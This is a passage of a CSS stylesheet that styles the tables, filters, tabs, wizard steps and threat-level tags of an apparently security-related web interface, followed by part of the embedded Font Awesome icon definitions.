            animation: inverted_pulse_v2 1s -0.166s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s4 {
            animation: inverted_pulse_v2 1s -0.249s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s5 {
            animation: inverted_pulse_v2 1s -0.332s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s6 {
            animation: inverted_pulse_v2 1s -0.415s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s7 {
            animation: inverted_pulse_v2 1s -0.498s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s8 {
            animation: inverted_pulse_v2 1s -0.581s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s9 {
            animation: inverted_pulse_v2 1s -0.664s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s10 {
            animation: inverted_pulse_v2 1s -0.747s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s11 {
            animation: inverted_pulse_v2 1s -0.83s infinite linear;
        }

        .mc-spinner.mc-inverted svg path.s12 {
            animation: inverted_pulse_v2 1s -0.913s infinite linear;
        }

        mc-switch .mc-switch-wrapper {
            line-height: 24px;
            transition: color 100ms ease;
        }

        mc-switch .mc-switch-wrapper .mc-switch-rail {
            background-color: #CCCCCC;
            border-radius: 12px;
            height: 24px;
            line-height: 24px;
            width: 40px;
            transition: background-color 100ms ease;
        }

        mc-switch .mc-switch-wrapper .mc-switch-rail .mc-switch-slider {
            box-shadow: rgba(0, 0, 0, 0.25) 0 0 5px;
            width: 20px;
            height: 20px;
            margin-left: 2px;
            margin-top: 2px;
            margin-bottom: 2px;
            transition: margin-left 100ms ease;
        }

        mc-switch .mc-switch-wrapper .mc-switch-label {
            transition: color 100ms ease;
        }

        mc-switch .mc-switch-wrapper:not(.on) .mc-switch-label {
            color: #999999;
        }

        mc-switch .mc-switch-wrapper.on .mc-switch-rail {
            background-color: #50b450;
        }

        mc-switch .mc-switch-wrapper.on .mc-switch-rail .mc-switch-slider {
            margin-left: 18px;
        }

        mc-switch .mc-switch-wrapper.disabled {
            color: #999999;
            cursor: not-allowed;
        }

        mc-switch .mc-switch-wrapper.disabled .mc-switch-rail {
            background-color: #CCCCCC;
        }

        mc-tab-container {
            padding-top: 30px;
            padding-bottom: 30px;
        }

        mc-table .mc-loader-full-container-is-loading,
        mc-table .mc-table-body-empty-results {
            border-top: 1px solid #CCCCCC;
            border-bottom-left-radius: 4px;
            border-bottom-right-radius: 4px;
        }

        mc-table .mc-table-wrapper {
            border: 1px solid #CCCCCC;
            border-radius: 6px;
        }

        mc-table .mc-table-scrolling-body {
            border-bottom: 1px solid #CCCCCC;
        }

        mc-table .mc-above-table {
            border-bottom: 1px solid #CCCCCC;
            border-bottom-width: 2px;
        }

        mc-table mc-header-row.mc-sticky-header {
            border-bottom-color: 1px solid #CCCCCC;
        }

        [mc-account-switch='true'] mc-table mc-header-row.mc-sticky-header {
            top: 130px;
        }

        [mc-account-switch='true'] mc-table .mc-table-before-content-actions-end.mc-sticky-header {
            top: 81px;
        }

        mc-table .mc-table-before-content-actions-end.mc-sticky-header mc-infinite-scroll-filters-wrapper mc-custom-dropdown-button .dropdown .dropdown-toggle {
            border-radius: 4px;
            padding: 4px 8px;
            height: 28px;
            font-size: 11px;
        }

        mc-body-row {
            color: #333333;
            border-top: 1px solid #CCCCCC;
        }

        mc-body-row.mc-highlighted-row {
            background-color: #ef6421;
        }

        mc-body-row:hover {
            background-color: #E5E5E5;
        }

        mc-body-row:last-child {
            border-bottom-left-radius: 6px;
            border-bottom-right-radius: 6px;
        }

        mc-body-row:nth-child(odd) {
            background-color: #F2F2F2;
        }

        mc-body-row:nth-child(odd).mc-highlighted-row {
            background-color: #ef6421;
        }

        mc-body-row:nth-child(odd):hover {
            background-color: #E5E5E5;
        }

        mc-table-filter-field-label {
            color: #333333;
        }

        mc-row-actions .mc-row-action-meatball-dot {
            background: #333333;
        }

        mc-body-cell {
            padding: 7px 7px;
        }

        mc-filters {
            background-color: #F2F2F2;
            border-bottom: 1px solid #CCCCCC;
            border-top-left-radius: 6px;
            border-top-right-radius: 6px;
        }

        mc-header-row {
            background-color: #FFFFFF;
            padding: 0 8px;
            border-bottom: 1px solid #CCCCCC;
        }

        mc-header-cell {
            padding: 7px 7px;
            color: #333333;
            font-weight: 600;
        }

        mc-header-cell.mc-header-cell-sort-dropdown:focus,
        mc-header-cell.mc-header-cell-sort-dropdown:hover {
            background-color: #F2F2F2;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button {
            width: 100%;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button button {
            background-color: transparent;
            color: #333333;
            font-weight: 600;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button button:hover,
        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button button:focus,
        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button button:active {
            box-shadow: none;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button.open .btn-secondary.dropdown-toggle {
            background-color: transparent;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button mc-dropdown-item a.dropdown-item {
            font-weight: 400;
        }

        mc-header-cell.mc-header-cell-sort-dropdown .mc-list-dropdown-button mc-dropdown-item.selected a.dropdown-item {
            font-weight: 600;
        }

        [mcRowAction]>.mc-row-action {
            color: #333333;
        }

        [mcRowAction]>.mc-row-action:hover,
        [mcRowAction]>.mc-row-action:focus {
            background-color: #F2F2F2;
            color: #333333;
        }

        [mcRowActionHeader] {
            font-weight: 600;
            font-size: 11px;
        }

        mc-show-hide-columns-dropdown .mc-show-hide-columns .mc-show-hide-columns-title,
        mc-show-hide-columns-dropdown .mc-show-hide-columns .mc-show-hide-columns-buttons-container,
        mc-show-hide-columns-dropdown .mc-show-hide-columns .mc-show-hide-columns-form-content {
            padding: 0 15px;
        }

        mc-show-hide-columns-dropdown .mc-show-hide-columns .mc-show-hide-columns-buttons-container {
            border-top: 1px solid #CCCCCC;
        }

        mc-show-hide-columns-dropdown .mc-show-hide-columns .mc-show-hide-columns-title.warning {
            color: #d63636;
        }

        mc-column-email .mc-column-email-plugin-cell .mc-column-email-plugin-cell-email {
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
        }

        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-action-container,
        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-buttons-container,
        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-section {
            padding-left: 15px;
            padding-right: 15px;
        }

        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-section,
        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-action-container {
            border-bottom-color: #CCCCCC;
        }

        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-action-container a.disabled {
            color: #999999;
        }

        mc-table-filter-field-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-action-container a.disabled:hover {
            text-decoration: none;
            cursor: not-allowed;
        }

        mc-table-filter-field-column-values .dropdown-menu {
            border-color: #CCCCCC;
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        mc-table-filter-field-column-values .btn-default {
            background-color: #FFFFFF;
        }

        mc-table-filter-field-column-values-modal label {
            color: #333333;
        }

        mc-table-filter-field-column-values-modal label.disabled {
            color: #999999;
        }

        mc-table-filter-field-column-values-modal .col-lg-3,
        mc-table-filter-field-column-values-modal .col-md-4,
        mc-table-filter-field-column-values-modal .col-sm-6,
        mc-table-filter-field-column-values-modal .col-xs-12 {
            padding-right: 15px;
        }

        mc-table-filter-field-column-values-modal .panel-default {
            margin-bottom: 15px;
        }

        mc-table-filter-field-column-values-modal .panel-body-with-search,
        mc-table-filter-field-column-values-modal .panel-body-with-no-search {
            padding-left: 15px;
        }

        mc-table-filter-field-column-values-modal .mc-input {
            background-color: #fff;
            border: 1px solid #CCCCCC;
        }

        mc-table-filter-field-column-values-modal .mc-modal-body {
            padding-right: 30px;
            padding-left: 45px;
        }

        mc-table-filter-field-column-values-modal .mc-modal-footer {
            padding: 30px;
        }

        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-select-all-container {
            color: #ef6421;
        }

        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-select-all-container,
        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-buttons-container,
        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-section {
            padding-left: 15px;
            padding-right: 15px;
        }

        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-title label {
            color: #666666;
        }

        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-section {
            border-bottom: 1px solid #CCCCCC;
        }

        mc-table-filter-field-sub-categories-column-values .mc-table-filter-column-values-container .mc-table-filter-column-values-select-all-container {
            border-bottom: 1px solid #CCCCCC;
        }

        mc-table-filter-field-search .mc-filter-search {
            width: 310px;
        }

        mc-table-filter-field-search .mc-filter-search input {
            height: 32px;
        }

        mc-table-filter-field-search .mc-filter-search input:focus~div .btn {
            border-color: #3a98d8;
        }

        mc-table-filter-field-search .mc-filter-search .mc-icon {
            height: 32px;
            background-color: white;
            color: #666666;
            border-color: #CCCCCC;
            padding-left: 5px;
            padding-right: 7px;
        }

        mc-table-filter-field-search .mc-filter-search .mc-icon:hover {
            color: #333333;
        }

        mc-table-filter-field-search .mc-filter-search .fa-search-container-disabled .fa-search {
            opacity: 0.5;
        }

        .mc-filter-search .mc-filter-input {
            width: 310px;
        }

        .mc-filter-search .mc-filter-input input {
            height: 32px;
        }

        .mc-filter-search .mc-filter-input input:focus {
            border-color: #CCCCCC;
        }

        .mc-filter-search .mc-dropdown-container .mc-native-select {
            max-width: 150px;
        }

        .mc-filter-search .mc-icon {
            height: 32px;
            background-color: white;
            color: #666666;
            border-color: #CCCCCC;
            padding-left: 5px;
            padding-right: 7px;
        }

        .mc-filter-search .mc-icon:hover {
            color: #333333;
        }

        .mc-filter-search .fa-search-container-disabled .fa-search {
            opacity: 0.5;
        }

        mc-tab-group .mc-tab-group.mc-tab-group-h {
            box-shadow: inset 0 -2px 0 0 #CCCCCC;
            padding: 0;
        }

        mc-tab-group .mc-tab-group.mc-tab-group-h.no-left-padding {
            padding: 0;
            margin-left: -10px;
            margin-right: -10px;
        }

        mc-tab-group .mc-tab-group.mc-tab-group-v {
            border-right: 1px solid #CCCCCC;
            width: 216px;
        }

        mc-tab-group .mc-tab-group.mc-tab-content-v {
            padding: 6px 18px;
        }

        mc-tab-group .mc-tab-group .mc-tab {
            font-weight: 600;
            font-size: inherit;
            color: #333333;
        }

        mc-tab-group .mc-tab-group .mc-tab.disabled {
            pointer-events: none;
            text-decoration: none;
            display: inline-block;
            /* For IE11/ MS Edge bug */
        }

        mc-tab-group .mc-tab-group .mc-tab.active {
            color: #ef6421;
        }

        mc-tab-group .mc-tab-group a.mc-tab-h {
            padding: 10px 15px;
            margin: 0;
            line-height: 17px;
        }

        mc-tab-group .mc-tab-group a.mc-tab-h.active {
            box-shadow: inset 0 -2px 0 0 #ef6421;
        }

        mc-tab-group .mc-tab-group a.mc-tab-h.is-bottom {
            box-shadow: inset 0 1px 0 0 #CCCCCC;
        }

        mc-tab-group .mc-tab-group a.mc-tab-h.is-bottom .mc-item.is-active {
            box-shadow: inset 0 2px 0 0 #ef6421;
        }

        mc-tab-group .mc-tab-group a.mc-tab-v {
            padding: 6px 18px;
            line-height: 17px;
        }

        mc-tab-group .mc-tab-group a.mc-tab-v:not(:last-child) {
            margin-bottom: 16px;
        }

        mc-tab-group .mc-tab-group a.mc-tab-v.active {
            box-shadow: inset 3px 0 0 0 #ef6421;
        }

        mc-tab-group.light-theme .mc-tab-group.mc-tab-group-h {
            box-shadow: inset 0 -1px 0 0 #CCCCCC;
        }

        mc-tab-group.light-theme .mc-tab {
            font-weight: inherit;
        }

        mc-time-picker div.dropdown-menu>ul {
            font-size: 14px;
            color: #666666;
        }

        mc-time-picker .max-height-limit {
            max-height: 250px;
        }

        mc-time-picker li.list-group-item {
            padding: 5px 15px;
        }

        mc-time-picker li.list-group-item:hover {
            color: #333333;
            background-color: #F2F2F2;
        }

        mc-time-picker li.list-group-item.bg-primary {
            background-color: #ef6421;
            color: #FFFFFF;
        }

        mc-tree-view .mc-tree-root span.toggle-children {
            color: #333333;
        }

        mc-tree-view .mc-tree-root .node-content-wrapper {
            color: #333333;
        }

        mc-tree-view .mc-tree-root .node-content-wrapper-focused,
        mc-tree-view .mc-tree-root .node-content-wrapper-active,
        mc-tree-view .mc-tree-root .node-content-wrapper.node-content-wrapper-active:hover,
        mc-tree-view .mc-tree-root .node-content-wrapper-active.node-content-wrapper-focused {
            color: #63a4ff;
        }

        mc-header-cell.mc-column-date-plugin-cell,
        mc-body-cell.mc-column-date-plugin-cell {
            flex: 0 0 175px;
        }

        mc-threat-tag .risk-level-high {
            color: white;
            background: #d32f2f;
        }

        mc-threat-tag .risk-level-medium {
            color: #333333;
            background: #ffad42;
        }

        mc-threat-tag .risk-level-low {
            color: #333333;
            background: #56c8d8;
        }

        mc-tag-selector .mc-tags .mc-tags-input-container {
            border-color: #CCCCCC;
            border-radius: 4px;
            text-decoration: none;
        }

        mc-tag-selector .mc-tags .mc-tags-input-container .form-control-feedback {
            color: #666666;
        }

        mc-tag-selector .mc-tags .mc-tags-search .form-group input {
            color: #333333;
        }

        mc-tag-selector .mc-tags .mc-tag {
            background-color: #CCCCCC;
            color: #333333;
        }

        mc-tag-selector .mc-tags .mc-tag:focus {
            background-color: #E5E5E5;
        }

        mc-tag-selector .mc-tags .mc-tag .mc-tag-remove {
            color: #666666;
        }

        mc-tag-selector .mc-tags .mc-tag .mc-tag-remove:hover {
            color: #333333;
        }

        mc-tag-selector .mc-tags .mc-tag-new-option {
            padding: 6px 12px;
            color: #333333;
        }

        mc-tag-selector .mc-tags .mc-tag-new-option:hover {
            background-color: #F2F2F2;
            color: #262626;
        }

        mc-tag-selector .mc-tags.disabled .mc-tags-input-container {
            background-color: #F2F2F2;
        }

        mc-tag-selector .mc-tags.disabled .mc-tags-search-disabled {
            color: #999999;
        }

        mc-tag-option .mc-tag-option {
            padding: 6px 12px;
            color: #333333;
        }

        mc-tag-option .mc-tag-option:hover {
            background-color: #F2F2F2;
            color: #262626;
        }

        mc-tag-option .dropdown-header {
            padding: 3px 12px;
        }

        mc-tag-option .mc-divider {
            background-color: #E5E5E5;
        }

        mc-wizard .mc-content {
            padding: 0 15px;
        }

        mc-wizard .mc-wizard-step {
            padding-right: 15px;
        }

        mc-wizard .mc-wizard-step.mc-edit-view .mc-wizard-step-title {
            color: #333333;
            cursor: pointer;
        }

        mc-wizard .mc-wizard-step.mc-edit-view .mc-wizard-step-title:hover {
            text-decoration: underline;
        }

        mc-wizard .mc-wizard-step.mc-edit-view .mc-step-circle {
            cursor: pointer;
        }

        mc-wizard .mc-wizard-step.mc-completed .mc-wizard-step-title {
            color: #333333;
        }

        mc-wizard .mc-wizard-step.mc-completed .mc-vertical-line {
            background-color: #409020;
        }

        mc-wizard .mc-wizard-step.mc-completed .mc-step-header .mc-step-circle {
            border-color: #409020;
            background-color: #409020;
        }

        mc-wizard .mc-wizard-step.mc-in-progress .mc-wizard-step-title {
            color: #333333;
        }

        mc-wizard .mc-wizard-step.mc-in-progress .mc-vertical-line:not(.mc-editable-step-line):first-child {
            background-color: #409020;
        }

        mc-wizard .mc-wizard-step.mc-in-progress .mc-step-circle {
            border-color: #409020;
            background-color: #EDF7ED;
            color: #409020;
        }

        mc-wizard .mc-wizard-step-title {
            color: #CCCCCC;
        }

        mc-wizard .mc-vertical-line {
            background-color: #CCCCCC;
        }

        mc-wizard .mc-step-header {
            color: #666666;
        }

        mc-wizard .mc-step-header .mc-step-circle {
            border-color: #CCCCCC;
        }

        mc-wizard .mc-border-left {
            border-left: 1px solid #CCCCCC;
        }

        mc-wizard .mc-wizard-main-steps {
            margin-right: 22.5px;
        }

        mc-wizard .mc-wizard-main-steps .panel {
            padding: 15px;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step-indicator .mc-step-header .mc-step-circle {
            font-weight: 600;
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            color: #CCCCCC;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step.mc-completed .mc-main-step-label {
            font-weight: 600;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step.mc-completed .mc-wizard-step-indicator .mc-step-header .mc-step-circle {
            color: #FFFFFF;
            border-color: #ef6421;
            background-color: #ef6421;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step.mc-in-progress .mc-main-step-label {
            font-weight: 600;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step.mc-in-progress .mc-wizard-step-indicator .mc-step-header {
            color: #ef6421;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step.mc-in-progress .mc-wizard-step-indicator .mc-step-header .mc-step-circle {
            border-color: #ef6421;
            background-color: #FFFFFF;
            color: #ef6421;
        }

        mc-wizard .mc-wizard-main-steps .mc-sub-step {
            color: #B2B2B2;
            font-size: 11px;
            padding-left: 30px;
            margin-bottom: 5px;
        }

        mc-wizard .mc-wizard-main-steps .mc-sub-step.mc-in-progress {
            color: #333333;
        }

        mc-wizard .mc-wizard-main-steps .mc-sub-step.mc-in-progress .far {
            color: #B2B2B2;
        }

        mc-wizard .mc-wizard-main-steps .mc-sub-step.mc-completed {
            color: #333333;
        }

        mc-wizard .mc-wizard-main-steps .mc-sub-step.mc-completed .fas {
            color: #409020;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step-title {
            font-size: 14px;
            padding-left: 10px;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step-title span {
            font-size: 11px;
            font-weight: 300;
        }

        mc-wizard .mc-wizard-main-steps .mc-wizard-step-title span.mc-main-step-label {
            font-weight: 300;
        }

        mc-breadcrumb .mc-breadcrumb-sep,
        mc-breadcrumb .mc-breadcrumb-item {
            color: #666666;
            font-size: 11px;
        }

        mc-breadcrumb .mc-breadcrumb-item {
            font-weight: 400;
        }

        mc-breadcrumb .mc-breadcrumb-item a {
            color: #666666;
        }

        mc-breadcrumb .mc-breadcrumb-item a:hover {
            text-decoration: underline;
            color: #333333;
        }

        mc-breadcrumb .mc-breadcrumb-item a:active {
            color: #0d0d0d;
        }

        mc-collapsed-text-input .icon:hover {
            background-color: #E5E5E5;
        }

        mc-collapsed-text-input .fa-expand {
            color: #333333;
        }

        mc-infinite-scroll-filters-wrapper mc-custom-dropdown-button .dropdown .dropdown-toggle {
            background-color: #FFFFFF;
            border-color: #FFFFFF;
            box-shadow: 0 4px 5px 0 rgba(0, 0, 0, 0.14), 0 1px 10px 0 rgba(0, 0, 0, 0.12), 0 2px 4px -1px rgba(0, 0, 0, 0.2);
        }

        /*!
 * Font Awesome Pro 5.15.4 by @fontawesome - https://fontawesome.com
 * License - https://fontawesome.com/license (Commercial License)
 */
        .fa,
        .fas,
        .far,
        .fal,
        .fad,
        .fab {
            -moz-osx-font-smoothing: grayscale;
            -webkit-font-smoothing: antialiased;
            display: inline-block;
            font-style: normal;
            font-variant: normal;
            text-rendering: auto;
            line-height: 1;
        }

        .fa-lg {
            font-size: 1.33333333em;
            line-height: 0.75em;
            vertical-align: -.0667em;
        }

        .fa-xs {
            font-size: .75em;
        }

        .fa-sm {
            font-size: .875em;
        }

        .fa-1x {
            font-size: 1em;
        }

        .fa-2x {
            font-size: 2em;
        }

        .fa-3x {
            font-size: 3em;
        }

        .fa-4x {
            font-size: 4em;
        }

        .fa-5x {
            font-size: 5em;
        }

        .fa-6x {
            font-size: 6em;
        }

        .fa-7x {
            font-size: 7em;
        }

        .fa-8x {
            font-size: 8em;
        }

        .fa-9x {
            font-size: 9em;
        }

        .fa-10x {
            font-size: 10em;
        }

        .fa-fw {
            text-align: center;
            width: 1.25em;
        }

        .fa-ul {
            list-style-type: none;
            margin-left: 2.5em;
            padding-left: 0;
        }

        .fa-ul>li {
            position: relative;
        }

        .fa-li {
            left: -2em;
            position: absolute;
            text-align: center;
            width: 2em;
            line-height: inherit;
        }

        .fa-border {
            border: solid 0.08em #eee;
            border-radius: .1em;
            padding: .2em .25em .15em;
        }

        .fa-pull-left {
            float: left;
        }

        .fa-pull-right {
            float: right;
        }

        .fa.fa-pull-left,
        .fas.fa-pull-left,
        .far.fa-pull-left,
        .fal.fa-pull-left,
        .fab.fa-pull-left {
            margin-right: .3em;
        }

        .fa.fa-pull-right,
        .fas.fa-pull-right,
        .far.fa-pull-right,
        .fal.fa-pull-right,
        .fab.fa-pull-right {
            margin-left: .3em;
        }

        .fa-spin {
            animation: fa-spin 2s infinite linear;
        }

        .fa-pulse {
            animation: fa-spin 1s infinite steps(8);
        }

        @keyframes fa-spin {
            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

        .fa-rotate-90 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=1)";
            transform: rotate(90deg);
        }

        .fa-rotate-180 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2)";
            transform: rotate(180deg);
        }

        .fa-rotate-270 {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=3)";
            transform: rotate(270deg);
        }

        .fa-flip-horizontal {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=0, mirror=1)";
            transform: scale(-1, 1);
        }

        .fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            transform: scale(1, -1);
        }

        .fa-flip-both,
        .fa-flip-horizontal.fa-flip-vertical {
            -ms-filter: "progid:DXImageTransform.Microsoft.BasicImage(rotation=2, mirror=1)";
            transform: scale(-1, -1);
        }

        :root .fa-rotate-90,
        :root .fa-rotate-180,
        :root .fa-rotate-270,
        :root .fa-flip-horizontal,
        :root .fa-flip-vertical,
        :root .fa-flip-both {
            filter: none;
        }

        .fa-stack {
            display: inline-block;
            height: 2em;
            line-height: 2em;
            position: relative;
            vertical-align: middle;
            width: 2.5em;
        }

        .fa-stack-1x,
        .fa-stack-2x {
            left: 0;
            position: absolute;
            text-align: center;
            width: 100%;
        }

        .fa-stack-1x {
            line-height: inherit;
        }

        .fa-stack-2x {
            font-size: 2em;
        }

        .fa-inverse {
            color: #fff;
        }

        /* Font Awesome uses the Unicode Private Use Area (PUA) to ensure screen
readers do not read off random characters that represent icons */
        .fa-500px:before {
            content: "\f26e";
        }

        .fa-abacus:before {
            content: "\f640";
        }

        .fa-accessible-icon:before {
            content: "\f368";
        }

        .fa-accusoft:before {
            content: "\f369";
        }

        .fa-acorn:before {
            content: "\f6ae";
        }

        .fa-acquisitions-incorporated:before {
            content: "\f6af";
        }

        .fa-ad:before {
            content: "\f641";
        }

        .fa-address-book:before {
            content: "\f2b9";
        }

        .fa-address-card:before {
            content: "\f2bb";
        }

        .fa-adjust:before {
            content: "\f042";
        }

        .fa-adn:before {
            content: "\f170";
        }

        .fa-adversal:before {
            content: "\f36a";
        }

        .fa-affiliatetheme:before {
            content: "\f36b";
        }

        .fa-air-conditioner:before {
            content: "\f8f4";
        }

        .fa-air-freshener:before {
            content: "\f5d0";
        }

        .fa-airbnb:before {
            content: "\f834";
        }

        .fa-alarm-clock:before {
            content: "\f34e";
        }

        .fa-alarm-exclamation:before {
            content: "\f843";
        }

        .fa-alarm-plus:before {
            content: "\f844";
        }

        .fa-alarm-snooze:before {
            content: "\f845";
        }

        .fa-album:before {
            content: "\f89f";
        }

        .fa-album-collection:before {
            content: "\f8a0";
        }

        .fa-algolia:before {
            content: "\f36c";
        }

        .fa-alicorn:before {
            content: "\f6b0";
        }

        .fa-alien:before {
            content: "\f8f5";
        }

        .fa-alien-monster:before {
            content: "\f8f6";
        }

        .fa-align-center:before {
            content: "\f037";
        }

        .fa-align-justify:before {
            content: "\f039";
        }

        .fa-align-left:before {
            content: "\f036";
        }

        .fa-align-right:before {
            content: "\f038";
        }

        .fa-align-slash:before {
            content: "\f846";
        }

        .fa-alipay:before {
            content: "\f642";
        }

        .fa-allergies:before {
            content: "\f461";
        }

        .fa-amazon:before {
            content: "\f270";
        }

        .fa-amazon-pay:before {
            content: "\f42c";
        }

        .fa-ambulance:before {
            content: "\f0f9";
        }

        .fa-american-sign-language-interpreting:before {
            content: "\f2a3";
        }

        .fa-amilia:before {
            content: "\f36d";
        }

        .fa-amp-guitar:before {
            content: "\f8a1";
        }

        .fa-analytics:before {
            content: "\f643";
        }

        .fa-anchor:before {
            content: "\f13d";
        }

        .fa-android:before {
            content: "\f17b";
        }

        .fa-angel:before {
            content: "\f779";
        }

        .fa-angellist:before {
            content: "\f209";
        }

        .fa-angle-double-down:before {
            content: "\f103";
        }

        .fa-angle-double-left:before {
            content: "\f100";
        }

        .fa-angle-double-right:before {
            content: "\f101";
        }

        .fa-angle-double-up:before {
            content: "\f102";
        }

        .fa-angle-down:before {
            content: "\f107";
        }

        .fa-angle-left:before {
            content: "\f104";
        }

        .fa-angle-right:before {
            content: "\f105";
        }

        .fa-angle-up:before {
            content: "\f106";
        }

        .fa-angry:before {
            content: "\f556";
        }

        .fa-angrycreative:before {
            content: "\f36e";
        }

        .fa-angular:before {
            content: "\f420";
        }

        .fa-ankh:before {
            content: "\f644";
        }

        .fa-app-store:before {
            content: "\f36f";
        }

        .fa-app-store-ios:before {
            content: "\f370";
        }

        .fa-apper:before {
            content: "\f371";
        }

        .fa-apple:before {
            content: "\f179";
        }

        .fa-apple-alt:before {
            content: "\f5d1";
        }

        .fa-apple-crate:before {
            content: "\f6b1";
        }

        .fa-apple-pay:before {
            content: "\f415";
        }

        .fa-archive:before {
            content: "\f187";
        }

        .fa-archway:before {
            content: "\f557";
        }

        .fa-arrow-alt-circle-down:before {
            content: "\f358";
        }

        .fa-arrow-alt-circle-left:before {
            content: "\f359";
        }

        .fa-arrow-alt-circle-right:before {
            content: "\f35a";
        }

        .fa-arrow-alt-circle-up:before {
            content: "\f35b";
        }

        .fa-arrow-alt-down:before {
            content: "\f354";
        }

        .fa-arrow-alt-from-bottom:before {
            content: "\f346";
        }

        .fa-arrow-alt-from-left:before {
            content: "\f347";
        }

        .fa-arrow-alt-from-right:before {
            content: "\f348";
        }

        .fa-arrow-alt-from-top:before {
            content: "\f349";
        }

        .fa-arrow-alt-left:before {
            content: "\f355";
        }

        .fa-arrow-alt-right:before {
            content: "\f356";
        }

        .fa-arrow-alt-square-down:before {
            content: "\f350";
        }

        .fa-arrow-alt-square-left:before {
            content: "\f351";
        }

        .fa-arrow-alt-square-right:before {
            content: "\f352";
        }

        .fa-arrow-alt-square-up:before {
            content: "\f353";
        }

        .fa-arrow-alt-to-bottom:before {
            content: "\f34a";
        }

        .fa-arrow-alt-to-left:before {
            content: "\f34b";
        }

        .fa-arrow-alt-to-right:before {
            content: "\f34c";
        }

        .fa-arrow-alt-to-top:before {
            content: "\f34d";
        }

        .fa-arrow-alt-up:before {
            content: "\f357";
        }

        .fa-arrow-circle-down:before {
            content: "\f0ab";
        }

        .fa-arrow-circle-left:before {
            content: "\f0a8";
        }

        .fa-arrow-circle-right:before {
            content: "\f0a9";
        }

        .fa-arrow-circle-up:before {
            content: "\f0aa";
        }

        .fa-arrow-down:before {
            content: "\f063";
        }

        .fa-arrow-from-bottom:before {
            content: "\f342";
        }

        .fa-arrow-from-left:before {
            content: "\f343";
        }

        .fa-arrow-from-right:before {
            content: "\f344";
        }

        .fa-arrow-from-top:before {
            content: "\f345";
        }

        .fa-arrow-left:before {
            content: "\f060";
        }

        .fa-arrow-right:before {
            content: "\f061";
        }

        .fa-arrow-square-down:before {
            content: "\f339";
        }

        .fa-arrow-square-left:before {
            content: "\f33a";
        }

        .fa-arrow-square-right:before {
            content: "\f33b";
        }

        .fa-arrow-square-up:before {
            content: "\f33c";
        }

        .fa-arrow-to-bottom:before {
            content: "\f33d";
        }

        .fa-arrow-to-left:before {
            content: "\f33e";
        }

        .fa-arrow-to-right:before {
            content: "\f340";
        }

        .fa-arrow-to-top:before {
            content: "\f341";
        }

        .fa-arrow-up:before {
            content: "\f062";
        }

        .fa-arrows:before {
            content: "\f047";
        }

        .fa-arrows-alt:before {
            content: "\f0b2";
        }

        .fa-arrows-alt-h:before {
            content: "\f337";
        }

        .fa-arrows-alt-v:before {
            content: "\f338";
        }

        .fa-arrows-h:before {
            content: "\f07e";
        }

        .fa-arrows-v:before {
            content: "\f07d";
        }

        .fa-artstation:before {
            content: "\f77a";
        }

        .fa-assistive-listening-systems:before {
            content: "\f2a2";
        }

        .fa-asterisk:before {
            content: "\f069";
        }

        .fa-asymmetrik:before {
            content: "\f372";
        }

        .fa-at:before {
            content: "\f1fa";
        }

        .fa-atlas:before {
            content: "\f558";
        }

        .fa-atlassian:before {
            content: "\f77b";
        }

        .fa-atom:before {
            content: "\f5d2";
        }

        .fa-atom-alt:before {
            content: "\f5d3";
        }

        .fa-audible:before {
            content: "\f373";
        }

        .fa-audio-description:before {
            content: "\f29e";
        }

        .fa-autoprefixer:before {
            content: "\f41c";
        }

        .fa-avianex:before {
            content: "\f374";
        }

        .fa-aviato:before {
            content: "\f421";
        }

        .fa-award:before {
            content: "\f559";
        }

        .fa-aws:before {
            content: "\f375";
        }

